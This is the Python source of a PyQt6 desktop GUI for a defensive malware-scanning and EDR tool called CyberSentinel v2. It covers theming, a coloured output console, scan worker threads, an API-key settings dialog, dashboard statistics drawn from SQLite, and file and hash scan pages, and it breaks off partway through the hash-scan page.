"""
gui.py — CyberSentinel v2 Desktop GUI
Run: python gui.py
Requires: pip install PyQt6
All existing modules (analysis_manager, lolbas_detector, etc.) are imported directly.
Output is streamed to the in-app console panel in real time via QThread workers.
"""

import sys
import re
import os
import sqlite3
import datetime
import threading

# ── Ensure imports resolve from the project root ──────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QLineEdit, QTextEdit, QFileDialog,
    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView,
    QSplitter, QFrame, QComboBox, QSpinBox, QGroupBox,
    QMessageBox, QProgressBar, QStackedWidget, QScrollArea,
    QSizePolicy, QDialog, QFormLayout, QDialogButtonBox,
)
from PyQt6.QtCore import (
    Qt, QThread, pyqtSignal, QTimer, QSize, QPropertyAnimation,
    QEasingCurve,
)
from PyQt6.QtGui import (
    QFont, QColor, QPalette, QTextCharFormat, QSyntaxHighlighter,
    QIcon, QPixmap, QPainter, QBrush, QLinearGradient,
)


# ══════════════════════════════════════════════════════════════════════════════
#  THEME
# ══════════════════════════════════════════════════════════════════════════════

THEME = {
    "bg":       "#0d1117",
    "surface":  "#161b22",
    "border":   "#30363d",
    "text":     "#c9d1d9",
    "muted":    "#8b949e",
    "red":      "#f85149",
    "green":    "#3fb950",
    "yellow":   "#d29922",
    "blue":     "#58a6ff",
    "purple":   "#bc8cff",
    "red_bg":   "rgba(248,81,73,0.12)",
    "green_bg": "rgba(63,185,80,0.12)",
    "blue_bg":  "rgba(88,166,255,0.12)",
}

BASE_STYLE = f"""
QMainWindow, QWidget {{
    background-color: {THEME['bg']};
    color: {THEME['text']};
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
}}
QTabWidget::pane {{
    border: 1px solid {THEME['border']};
    background: {THEME['surface']};
    border-radius: 6px;
}}
QTabBar::tab {{
    background: {THEME['bg']};
    color: {THEME['muted']};
    border: 1px solid {THEME['border']};
    border-bottom: none;
    padding: 7px 16px;
    border-radius: 5px 5px 0 0;
    margin-right: 2px;
    font-size: 11px;
}}
QTabBar::tab:selected {{
    background: {THEME['surface']};
    color: {THEME['text']};
    border-color: {THEME['border']};
}}
QTabBar::tab:hover:!selected {{
    color: {THEME['blue']};
    border-color: {THEME['blue']};
}}
QPushButton {{
    background: {THEME['surface']};
    color: {THEME['text']};
    border: 1px solid {THEME['border']};
    padding: 7px 16px;
    border-radius: 5px;
    font-size: 12px;
}}
QPushButton:hover {{
    border-color: {THEME['blue']};
    color: {THEME['blue']};
}}
QPushButton:pressed {{
    background: {THEME['blue_bg']};
}}
QPushButton#danger {{
    color: {THEME['red']};
    border-color: {THEME['red']};
}}
QPushButton#danger:hover {{
    background: {THEME['red_bg']};
}}
QPushButton#success {{
    color: {THEME['green']};
    border-color: {THEME['green']};
}}
QPushButton#success:hover {{
    background: {THEME['green_bg']};
}}
QPushButton#primary {{
    background: {THEME['blue']};
    color: #0d1117;
    border: none;
    font-weight: bold;
}}
QPushButton#primary:hover {{
    background: #79baff;
}}
QLineEdit, QTextEdit, QComboBox, QSpinBox {{
    background: {THEME['bg']};
    color: {THEME['text']};
    border: 1px solid {THEME['border']};
    border-radius: 4px;
    padding: 5px 8px;
    selection-background-color: {THEME['blue']};
}}
QLineEdit:focus, QTextEdit:focus {{
    border-color: {THEME['blue']};
}}
QTableWidget {{
    background: {THEME['surface']};
    color: {THEME['text']};
    border: 1px solid {THEME['border']};
    gridline-color: {THEME['border']};
    border-radius: 4px;
}}
QTableWidget::item {{
    padding: 4px 8px;
    border-bottom: 1px solid {THEME['border']};
}}
QTableWidget::item:selected {{
    background: {THEME['blue_bg']};
    color: {THEME['text']};
}}
QHeaderView::section {{
    background: {THEME['bg']};
    color: {THEME['muted']};
    padding: 5px 8px;
    border: none;
    border-bottom: 1px solid {THEME['border']};
    font-size: 11px;
}}
QScrollBar:vertical {{
    background: {THEME['bg']};
    width: 8px;
    border-radius: 4px;
}}
QScrollBar::handle:vertical {{
    background: {THEME['border']};
    border-radius: 4px;
    min-height: 20px;
}}
QScrollBar::handle:vertical:hover {{
    background: {THEME['muted']};
}}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
QGroupBox {{
    border: 1px solid {THEME['border']};
    border-radius: 6px;
    margin-top: 10px;
    padding-top: 8px;
    color: {THEME['muted']};
    font-size: 11px;
}}
QGroupBox::title {{
    subcontrol-origin: margin;
    left: 10px;
    padding: 0 4px;
}}
QSplitter::handle {{
    background: {THEME['border']};
    width: 1px;
}}
QProgressBar {{
    background: {THEME['bg']};
    border: 1px solid {THEME['border']};
    border-radius: 4px;
    text-align: center;
    color: {THEME['text']};
    height: 6px;
}}
QProgressBar::chunk {{
    background: {THEME['blue']};
    border-radius: 4px;
}}
QLabel#header {{
    color: {THEME['blue']};
    font-size: 18px;
    font-weight: bold;
    letter-spacing: 2px;
}}
QLabel#subheader {{
    color: {THEME['muted']};
    font-size: 11px;
}}
"""


# ══════════════════════════════════════════════════════════════════════════════
#  OUTPUT CONSOLE WIDGET  (renders colored EDR output)
# ══════════════════════════════════════════════════════════════════════════════

class ConsoleWidget(QTextEdit):
    def __init__(self):
        super().__init__()
        self.setReadOnly(True)
        self.setFont(QFont("Consolas", 11))
        self.setStyleSheet(f"""
            QTextEdit {{
                background: #0a0e14;
                color: {THEME['text']};
                border: 1px solid {THEME['border']};
                border-radius: 4px;
                padding: 6px;
            }}
        """)

    # Compiled ANSI escape stripper
    _ANSI_RE = re.compile(r'\x1b\[[0-9;]*[mGKHF]|\x1b\[[0-9;]*m|\033\[[0-9;]*[mGKHF]')

    def append_line(self, text: str, color: str = None):
        # Strip ANSI codes, carriage returns and backspaces (spinner artifacts)
        text = self._ANSI_RE.sub('', text)
        text = text.replace('\r', '').replace('\b', '').rstrip()
        if not text:
            return
        fmt = QTextCharFormat()
        c = color or self._auto_color(text)
        fmt.setForeground(QColor(c))
        cursor = self.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        cursor.insertText(text + "\n", fmt)
        self.setTextCursor(cursor)
        self.ensureCursorVisible()

    def _auto_color(self, text: str) -> str:
        t = text.upper()
        if any(k in t for k in ("MALICIOUS", "CRITICAL", "THREAT", "ERROR", "FAIL", "⚠", "🔴", "[!]")):
            return THEME["red"]
        if any(k in t for k in ("SAFE", "SUCCESS", "CLEAN", "[+]")):
            return THEME["green"]
        if any(k in t for k in ("SUSPICIOUS", "WARNING", "CACHE HIT", "WEBHOOK")):
            return THEME["yellow"]
        if any(k in t for k in ("TIER", "SHA", "TARGET", "INITIALIZ", "[*]")):
            return THEME["blue"]
        return THEME["text"]

    def clear_console(self):
        self.clear()
        self.append_line("─" * 60, THEME["border"])


# ══════════════════════════════════════════════════════════════════════════════
#  STAT CARD WIDGET
# ══════════════════════════════════════════════════════════════════════════════

class StatCard(QFrame):
    def __init__(self, label: str, color: str = None):
        super().__init__()
        self.color = color or THEME["blue"]
        self.setFixedHeight(72)
        self.setStyleSheet(f"""
            QFrame {{
                background: {THEME['surface']};
                border: 1px solid {THEME['border']};
                border-radius: 8px;
            }}
        """)
        layout = QVBoxLayout(self)
        layout.setContentsMargins(14, 10, 14, 10)
        layout.setSpacing(2)

        self.value_lbl = QLabel("—")
        self.value_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.value_lbl.setFont(QFont("Consolas", 20, QFont.Weight.Bold))
        self.value_lbl.setStyleSheet(f"color: {self.color}; border: none;")

        self.label_lbl = QLabel(label)
        self.label_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.label_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")

        layout.addWidget(self.value_lbl)
        layout.addWidget(self.label_lbl)

    def set_value(self, val):
        self.value_lbl.setText(str(val))


# ══════════════════════════════════════════════════════════════════════════════
#  WORKER THREADS  (run backend ops without freezing the GUI)
# ══════════════════════════════════════════════════════════════════════════════

class OutputCapture:
    """Intercepts print() calls from EDR modules and emits them as Qt signals."""
    def __init__(self, signal):
        self._signal = signal
        self._orig_stdout = sys.stdout

    def write(self, text):
        for line in text.splitlines():
            if line.strip():
                self._signal.emit(line)
        self._orig_stdout.write(text)

    def flush(self):
        self._orig_stdout.flush()


class ScanWorker(QThread):
    line_out  = pyqtSignal(str)
    finished  = pyqtSignal(bool)

    def __init__(self, logic, target: str):
        super().__init__()
        self.logic  = logic
        self.target = target

    def run(self):
        cap = OutputCapture(self.line_out)
        sys.stdout = cap
        try:
            if os.path.isdir(self.target):
                count = 0
                for root, _, files in os.walk(self.target):
                    for f in files:
                        fp = os.path.join(root, f)
                        if fp.lower().endswith((".exe",".dll",".sys",".scr",".cpl",".ocx",".bin",".tmp")):
                            self.logic.scan_file(fp)
                            count += 1
                self.line_out.emit(f"[+] Batch complete — {count} files analyzed.")
            elif os.path.isfile(self.target):
                self.logic.scan_file(self.target)
            else:
                self.line_out.emit(f"[-] Invalid path: {self.target}")
            self.finished.emit(True)
        except Exception as e:
            self.line_out.emit(f"[-] Scan error: {e}")
            self.finished.emit(False)
        finally:
            sys.stdout = cap._orig_stdout


class HashWorker(QThread):
    line_out = pyqtSignal(str)
    finished = pyqtSignal(bool)

    def __init__(self, logic, hashes: list):
        super().__init__()
        self.logic  = logic
        self.hashes = hashes

    def run(self):
        cap = OutputCapture(self.line_out)
        sys.stdout = cap
        try:
            for h in self.hashes:
                self.logic.scan_hash(h)
            self.finished.emit(True)
        except Exception as e:
            self.line_out.emit(f"[-] Error: {e}")
            self.finished.emit(False)
        finally:
            sys.stdout = cap._orig_stdout


class GenericWorker(QThread):
    line_out = pyqtSignal(str)
    finished = pyqtSignal(object)

    def __init__(self, fn, *args, **kwargs):
        super().__init__()
        self._fn   = fn
        self._args = args
        self._kw   = kwargs

    def run(self):
        cap = OutputCapture(self.line_out)
        sys.stdout = cap
        try:
            result = self._fn(*self._args, **self._kw)
            self.finished.emit(result)
        except Exception as e:
            self.line_out.emit(f"[-] Error: {e}")
            self.finished.emit(None)
        finally:
            sys.stdout = cap._orig_stdout


# ══════════════════════════════════════════════════════════════════════════════
#  SETTINGS DIALOG
# ══════════════════════════════════════════════════════════════════════════════

class SettingsDialog(QDialog):
    def __init__(self, logic, parent=None):
        super().__init__(parent)
        self.logic = logic
        self.setWindowTitle("Configure Cloud Integrations")
        self.setMinimumWidth(480)
        self.setStyleSheet(BASE_STYLE + f"QDialog {{ background: {THEME['surface']}; }}")

        layout = QVBoxLayout(self)
        layout.setSpacing(12)

        title = QLabel("Cloud API Keys & Webhook")
        title.setStyleSheet(f"color: {THEME['blue']}; font-size: 14px; font-weight: bold;")
        layout.addWidget(title)

        note = QLabel("Keys are encrypted with Fernet AES-128 and saved to config.json")
        note.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
        layout.addWidget(note)

        form = QFormLayout()
        form.setSpacing(8)

        self.fields = {}
        for key in ("virustotal", "alienvault", "metadefender", "malwarebazaar"):
            le = QLineEdit()
            le.setEchoMode(QLineEdit.EchoMode.Password)
            current = logic.api_keys.get(key, "")
            le.setPlaceholderText("••••••••••••••••" if current else "Not configured")
            le.setText(current)
            self.fields[key] = le
            form.addRow(QLabel(key.capitalize() + ":"), le)

        self.webhook_field = QLineEdit()
        self.webhook_field.setText(logic.webhook_url or "")
        self.webhook_field.setPlaceholderText("https://discord.com/api/webhooks/...")
        form.addRow(QLabel("Webhook URL:"), self.webhook_field)

        layout.addLayout(form)

        btns = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Save |
            QDialogButtonBox.StandardButton.Cancel
        )
        btns.accepted.connect(self.save)
        btns.rejected.connect(self.reject)
        layout.addWidget(btns)

    def save(self):
        from modules import utils
        for key, le in self.fields.items():
            val = le.text().strip()
            if val:
                self.logic.api_keys[key] = val
            else:
                self.logic.api_keys.pop(key, None)
        self.logic.webhook_url = self.webhook_field.text().strip()
        utils.save_config(self.logic.api_keys, self.logic.webhook_url)
        self.accept()


# ══════════════════════════════════════════════════════════════════════════════
#  DATABASE HELPERS  (for live tables)
# ══════════════════════════════════════════════════════════════════════════════

def _db_query(sql, params=()):
    db = os.path.join(BASE_DIR, "threat_cache.db")
    if not os.path.isfile(db):
        return []
    try:
        with sqlite3.connect(db) as c:
            c.row_factory = sqlite3.Row
            return [dict(r) for r in c.execute(sql, params).fetchall()]
    except Exception:
        return []

def _db_count(sql, params=()):
    rows = _db_query(sql, params)
    return rows[0]["c"] if rows else 0


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def verdict_color(v: str) -> str:
    v = (v or "").upper()
    if "MALICIOUS" in v or "CRITICAL" in v: return THEME["red"]
    if "SUSPICIOUS" in v:                   return THEME["yellow"]
    if "SAFE" in v:                         return THEME["green"]
    return THEME["muted"]

def make_table(headers: list, stretch_col: int = -1) -> QTableWidget:
    """stretch_col: index of column to stretch; others resize to contents.
    Pass -1 (default) to stretch the last column."""
    t = QTableWidget(0, len(headers))
    t.setHorizontalHeaderLabels(headers)
    hdr = t.horizontalHeader()
    last = len(headers) - 1
    target = stretch_col if stretch_col >= 0 else last
    for i in range(len(headers)):
        if i == target:
            hdr.setSectionResizeMode(i, QHeaderView.ResizeMode.Stretch)
        else:
            hdr.setSectionResizeMode(i, QHeaderView.ResizeMode.ResizeToContents)
    t.verticalHeader().setVisible(False)
    t.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
    t.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
    t.setAlternatingRowColors(False)
    return t

def table_item(text: str, color: str = None) -> QTableWidgetItem:
    s = str(text or "—")
    item = QTableWidgetItem(s)
    item.setForeground(QColor(color or THEME["text"]))
    # Full text always visible on hover — never loses data to truncation
    item.setToolTip(s)
    return item


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN WINDOW
# ══════════════════════════════════════════════════════════════════════════════

class CyberSentinelGUI(QMainWindow):

    def __init__(self):
        super().__init__()
        self.setWindowTitle("CyberSentinel v2 — EDR Console")
        self.setMinimumSize(1200, 760)
        self.setStyleSheet(BASE_STYLE)
        self._workers = []   # keep references so GC doesn't destroy threads

        # Import backend
        try:
            from modules import ScannerLogic, utils as _utils
            from modules.lolbas_detector  import LolbasDetector
            from modules.byovd_detector   import ByovdDetector
            from modules.chain_correlator import ChainCorrelator
            from modules.baseline_engine  import BaselineEngine
            from modules.amsi_monitor     import AmsiMonitor
            from modules.intel_updater    import update_all, feed_status
            from modules.network_isolation import isolate_network, restore_network

            self.logic    = ScannerLogic()
            self.lolbas   = LolbasDetector()
            self.byovd    = ByovdDetector()
            self.correlator = ChainCorrelator()
            self.baseline = BaselineEngine()
            self.amsi     = AmsiMonitor()
            self.update_all   = update_all
            self.feed_status  = feed_status
            self.isolate_net  = isolate_network
            self.restore_net  = restore_network
            self._backend_ok  = True
        except ImportError as e:
            self._backend_ok = False
            self._import_error = str(e)

        self._build_ui()

        # Auto-refresh dashboard stats every 30 s
        self._refresh_timer = QTimer(self)
        self._refresh_timer.timeout.connect(self._refresh_dashboard)
        self._refresh_timer.start(30_000)
        self._refresh_dashboard()

    # ── UI BUILD ──────────────────────────────────────────────────────────────

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QHBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # Left sidebar navigation
        root.addWidget(self._build_sidebar())

        # Main content area
        self._stack = QStackedWidget()
        root.addWidget(self._stack, 1)

        self._pages = {}
        for name, builder in [
            ("dashboard",  self._build_dashboard_page),
            ("scan_file",  self._build_scan_file_page),
            ("scan_hash",  self._build_scan_hash_page),
            ("live_edr",   self._build_live_edr_page),
            ("lolbas",     self._build_lolbas_page),
            ("byovd",      self._build_byovd_page),
            ("chains",     self._build_chains_page),
            ("baseline",   self._build_baseline_page),
            ("fileless",   self._build_fileless_page),
            ("network",    self._build_network_page),
            ("intel",      self._build_intel_page),
            ("settings",   self._build_settings_page),
        ]:
            page = builder()
            self._pages[name] = self._stack.addWidget(page)

        if not self._backend_ok:
            self._show_page("dashboard")

    def _build_sidebar(self):
        sidebar = QFrame()
        sidebar.setFixedWidth(200)
        sidebar.setStyleSheet(f"""
            QFrame {{
                background: {THEME['surface']};
                border-right: 1px solid {THEME['border']};
            }}
        """)
        layout = QVBoxLayout(sidebar)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # Logo
        logo_frame = QFrame()
        logo_frame.setStyleSheet(f"border-bottom: 1px solid {THEME['border']};")
        logo_layout = QVBoxLayout(logo_frame)
        logo_layout.setContentsMargins(16, 16, 16, 16)
        logo_layout.setSpacing(2)

        icon_lbl = QLabel("🛡️")
        icon_lbl.setFont(QFont("Segoe UI Emoji", 22))
        icon_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        icon_lbl.setStyleSheet("border: none;")

        title_lbl = QLabel("CyberSentinel")
        title_lbl.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
        title_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_lbl.setStyleSheet(f"color: {THEME['blue']}; border: none;")

        ver_lbl = QLabel("v2 — EDR Console")
        ver_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        ver_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")

        logo_layout.addWidget(icon_lbl)
        logo_layout.addWidget(title_lbl)
        logo_layout.addWidget(ver_lbl)
        layout.addWidget(logo_frame)

        # Nav buttons
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll.setStyleSheet("border: none; background: transparent;")

        nav_widget = QWidget()
        nav_layout = QVBoxLayout(nav_widget)
        nav_layout.setContentsMargins(8, 8, 8, 8)
        nav_layout.setSpacing(2)
        nav_widget.setStyleSheet("background: transparent;")

        sections = [
            ("", []),
            ("OVERVIEW", [
                ("📊  Dashboard",       "dashboard"),
            ]),
            ("CORE SCANNING", [
                ("🔍  Scan File",        "scan_file"),
                ("🔑  Scan Hash / IoC", "scan_hash"),
                ("⚡  Live EDR",         "live_edr"),
            ]),
            ("DETECTORS", [
                ("🪝  LoLBin Abuse",    "lolbas"),
                ("💀  BYOVD Drivers",   "byovd"),
                ("🔗  Attack Chains",   "chains"),
                ("📐  Baseline",        "baseline"),
                ("👻  Fileless / AMSI", "fileless"),
            ]),
            ("MANAGEMENT", [
                ("🌐  Network",         "network"),
                ("📡  Intel Feeds",     "intel"),
                ("⚙️  Settings",        "settings"),
            ]),
        ]

        self._nav_buttons = {}
        for section_title, items in sections:
            if section_title:
                lbl = QLabel(section_title)
                lbl.setStyleSheet(f"""
                    color: {THEME['muted']};
                    font-size: 9px;
                    font-weight: bold;
                    letter-spacing: 1.5px;
                    padding: 10px 8px 4px 8px;
                    background: transparent;
                """)
                nav_layout.addWidget(lbl)

            for btn_text, page_name in items:
                btn = QPushButton(btn_text)
                btn.setObjectName(f"nav_{page_name}")
                btn.setStyleSheet(self._nav_style(False))
                btn.clicked.connect(lambda checked, p=page_name: self._show_page(p))
                nav_layout.addWidget(btn)
                self._nav_buttons[page_name] = btn

        nav_layout.addStretch()
        scroll.setWidget(nav_widget)
        layout.addWidget(scroll, 1)

        # Bottom status
        self._status_bar = QLabel("● Ready")
        self._status_bar.setStyleSheet(f"""
            color: {THEME['green']};
            font-size: 10px;
            padding: 8px 14px;
            border-top: 1px solid {THEME['border']};
            background: transparent;
        """)
        layout.addWidget(self._status_bar)

        return sidebar

    def _nav_style(self, active: bool) -> str:
        if active:
            return f"""
                QPushButton {{
                    background: {THEME['blue_bg']};
                    color: {THEME['blue']};
                    border: 1px solid {THEME['blue']};
                    border-radius: 5px;
                    padding: 8px 12px;
                    text-align: left;
                    font-size: 12px;
                }}
            """
        return f"""
            QPushButton {{
                background: transparent;
                color: {THEME['muted']};
                border: 1px solid transparent;
                border-radius: 5px;
                padding: 8px 12px;
                text-align: left;
                font-size: 12px;
            }}
            QPushButton:hover {{
                background: rgba(88,166,255,0.06);
                color: {THEME['text']};
                border-color: {THEME['border']};
            }}
        """

    def _show_page(self, name: str):
        if name in self._pages:
            self._stack.setCurrentIndex(self._pages[name])
        for pname, btn in self._nav_buttons.items():
            btn.setStyleSheet(self._nav_style(pname == name))
        if name == "dashboard":
            self._refresh_dashboard()
        elif name == "chains":
            self._refresh_chains()
        elif name == "fileless":
            self._refresh_fileless()

    # ── PAGE: HEADER HELPER ───────────────────────────────────────────────────

    def _page_header(self, icon: str, title: str, subtitle: str):
        frame = QFrame()
        frame.setStyleSheet(f"""
            QFrame {{
                background: {THEME['surface']};
                border-bottom: 1px solid {THEME['border']};
                border-radius: 0;
            }}
        """)
        h = QHBoxLayout(frame)
        h.setContentsMargins(24, 16, 24, 16)
        h.setSpacing(12)

        icon_lbl = QLabel(icon)
        icon_lbl.setFont(QFont("Segoe UI Emoji", 20))
        icon_lbl.setStyleSheet("border: none;")

        txt = QVBoxLayout()
        txt.setSpacing(2)
        t = QLabel(title)
        t.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        t.setStyleSheet(f"color: {THEME['blue']}; border: none;")
        s = QLabel(subtitle)
        s.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")
        txt.addWidget(t)
        txt.addWidget(s)

        h.addWidget(icon_lbl)
        h.addLayout(txt)
        h.addStretch()
        frame.setFixedHeight(68)
        return frame

    # ── PAGE: CONSOLE PANE HELPER ─────────────────────────────────────────────

    def _with_console(self, top_widget, console_attr: str):
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.addWidget(top_widget)
        console = ConsoleWidget()
        console.append_line("● Console ready.", THEME["muted"])
        setattr(self, console_attr, console)
        splitter.addWidget(console)
        splitter.setSizes([400, 200])
        return splitter

    # ── PAGE: DASHBOARD ───────────────────────────────────────────────────────

    def _build_dashboard_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        layout.addWidget(self._page_header(
            "📊", "SOC Dashboard",
            "Live threat statistics — auto-refreshes every 30 seconds"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(16)

        # Stats row
        stats_row = QHBoxLayout()
        stats_row.setSpacing(12)
        self._stat_cards = {}
        for label, key, color in [
            ("Total Scans",     "total",    THEME["blue"]),
            ("Malicious",       "mal",      THEME["red"]),
            ("Safe",            "safe",     THEME["green"]),
            ("False Positives", "fp",       THEME["yellow"]),
            ("Chain Alerts",    "chains",   THEME["red"]),
            ("BYOVD Alerts",    "byovd",    THEME["red"]),
            ("Fileless Alerts", "fileless", THEME["purple"]),
        ]:
            card = StatCard(label, color)
            self._stat_cards[key] = card
            stats_row.addWidget(card)
        inner_layout.addLayout(stats_row)

        # Refresh button
        btn_row = QHBoxLayout()
        refresh_btn = QPushButton("↻  Refresh Now")
        refresh_btn.setObjectName("primary")
        refresh_btn.setFixedWidth(140)
        refresh_btn.clicked.connect(self._refresh_dashboard)
        btn_row.addWidget(refresh_btn)
        btn_row.addStretch()

        self._db_path_lbl = QLabel()
        self._db_path_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
        btn_row.addWidget(self._db_path_lbl)
        inner_layout.addLayout(btn_row)

        # Recent scans table
        grp = QGroupBox("Recent Scan History")
        grp_layout = QVBoxLayout(grp)
        self._dash_table = make_table(["Timestamp", "File", "SHA-256", "Verdict"], stretch_col=1)
        grp_layout.addWidget(self._dash_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        return page

    def _refresh_dashboard(self):
        db = os.path.join(BASE_DIR, "threat_cache.db")
        self._db_path_lbl.setText(f"DB: {db}  |  Exists: {'✓' if os.path.isfile(db) else '✗'}")

        counts = {
            "total":    _db_count("SELECT COUNT(*) c FROM scan_cache"),
            "mal":      _db_count("SELECT COUNT(*) c FROM scan_cache WHERE verdict LIKE '%MALICIOUS%' OR verdict LIKE '%CRITICAL%'"),
            "safe":     _db_count("SELECT COUNT(*) c FROM scan_cache WHERE verdict='SAFE'"),
            "fp":       _db_count("SELECT COUNT(*) c FROM analyst_feedback WHERE analyst_verdict='FALSE_POSITIVE'"),
            "chains":   _db_count("SELECT COUNT(*) c FROM chain_alerts"),
            "byovd":    _db_count("SELECT COUNT(*) c FROM driver_alerts"),
            "fileless": _db_count("SELECT COUNT(*) c FROM fileless_alerts"),
        }
        for key, card in self._stat_cards.items():
            card.set_value(counts.get(key, 0))

        rows = _db_query(
            "SELECT sha256, filename, verdict, timestamp FROM scan_cache ORDER BY timestamp DESC LIMIT 100"
        )
        t = self._dash_table
        t.setRowCount(0)
        for r in rows:
            row = t.rowCount()
            t.insertRow(row)
            t.setItem(row, 0, table_item(r.get("timestamp", "")))
            t.setItem(row, 1, table_item(r.get("filename", "—")))
            t.setItem(row, 2, table_item(r.get("sha256") or ""))
            v = r.get("verdict", "")
            t.setItem(row, 3, table_item(v, verdict_color(v)))

    # ── PAGE: SCAN FILE ───────────────────────────────────────────────────────

    def _build_scan_file_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🔍", "Scan File or Directory",
            "Tier 1 Cloud + Tier 2 ML + Tier 3 AI — full pipeline"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        # Path input row
        path_grp = QGroupBox("Target")
        path_layout = QHBoxLayout(path_grp)
        self._scan_path = QLineEdit()
        self._scan_path.setPlaceholderText("Enter file or folder path, or click Browse…")
        browse_btn = QPushButton("📂  Browse")
        browse_btn.setFixedWidth(110)
        browse_btn.clicked.connect(self._browse_scan_file)
        browse_dir_btn = QPushButton("📁  Folder")
        browse_dir_btn.setFixedWidth(90)
        browse_dir_btn.clicked.connect(self._browse_scan_dir)
        path_layout.addWidget(self._scan_path)
        path_layout.addWidget(browse_btn)
        path_layout.addWidget(browse_dir_btn)
        inner_layout.addWidget(path_grp)

        # Options row
        opts_row = QHBoxLayout()
        engine_grp = QGroupBox("Cloud Engine")
        engine_layout = QHBoxLayout(engine_grp)
        self._engine_combo = QComboBox()
        self._engine_combo.addItems([
            "Smart Consensus (all APIs)",
            "VirusTotal only",
            "AlienVault OTX only",
            "MetaDefender only",
            "MalwareBazaar only",
        ])
        engine_layout.addWidget(self._engine_combo)
        opts_row.addWidget(engine_grp)
        opts_row.addStretch()

        self._scan_file_btn = QPushButton("  ▶  Run Scan")
        self._scan_file_btn.setObjectName("primary")
        self._scan_file_btn.setFixedWidth(130)
        self._scan_file_btn.clicked.connect(self._run_scan_file)
        opts_row.addWidget(self._scan_file_btn)

        clear_btn = QPushButton("🗑  Clear")
        clear_btn.setFixedWidth(80)
        clear_btn.clicked.connect(lambda: self._scan_console.clear_console())
        opts_row.addWidget(clear_btn)
        inner_layout.addLayout(opts_row)

        # Progress
        self._scan_progress = QProgressBar()
        self._scan_progress.setRange(0, 0)
        self._scan_progress.setVisible(False)
        self._scan_progress.setFixedHeight(4)
        inner_layout.addWidget(self._scan_progress)

        # Console
        self._scan_console = ConsoleWidget()
        self._scan_console.append_line("● Ready to scan. Select a file and click Run Scan.", THEME["muted"])
        inner_layout.addWidget(self._scan_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _browse_scan_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File")
        if path:
            self._scan_path.setText(path)

    def _browse_scan_dir(self):
        path = QFileDialog.getExistingDirectory(self, "Select Directory")
        if path:
            self._scan_path.setText(path)

    def _run_scan_file(self):
        target = self._scan_path.text().strip().strip("\"'")
        if not target:
            QMessageBox.warning(self, "No Target", "Please select a file or directory first.")
            return

        engine_map = {0: "consensus", 1: "virustotal", 2: "alienvault",
                      3: "metadefender", 4: "malwarebazaar"}
        self.logic.headless_mode = True  # GUI mode — no interactive prompts
        self._scan_console.clear_console()
        self._scan_console.append_line(f"[*] Starting scan: {target}", THEME["blue"])
        self._scan_progress.setVisible(True)
        self._scan_file_btn.setEnabled(False)

        worker = ScanWorker(self.logic, target)
        worker.line_out.connect(self._scan_console.append_line)
        worker.finished.connect(self._scan_done)
        self._workers.append(worker)
        worker.start()

    def _scan_done(self, ok: bool):
        self._scan_progress.setVisible(False)
        self._scan_file_btn.setEnabled(True)
        msg = "[+] Scan complete." if ok else "[-] Scan ended with errors."
        self._scan_console.append_line(msg, THEME["green"] if ok else THEME["red"])
        self._refresh_dashboard()

    # ── PAGE: SCAN HASH ───────────────────────────────────────────────────────

    def _build_scan_hash_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🔑", "Scan Hash / IoC Batch",
            "Enter a SHA-256/MD5/SHA-1 hash, or load a .txt IoC list"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        grp = QGroupBox("Hash Input")
        grp_layout = QVBoxLayout(grp)

        single_row = QHBoxLayout()
        self._hash_input = QLineEdit()
        self._hash_input.setPlaceholderText("Paste a single SHA-256 / MD5 / SHA-1 hash…")
        self._hash_input.returnPressed.connect(self._run_hash_scan)
        single_row.addWidget(self._hash_input)
        scan_hash_btn = QPushButton("▶  Scan")
        scan_hash_btn.setObjectName("primary")
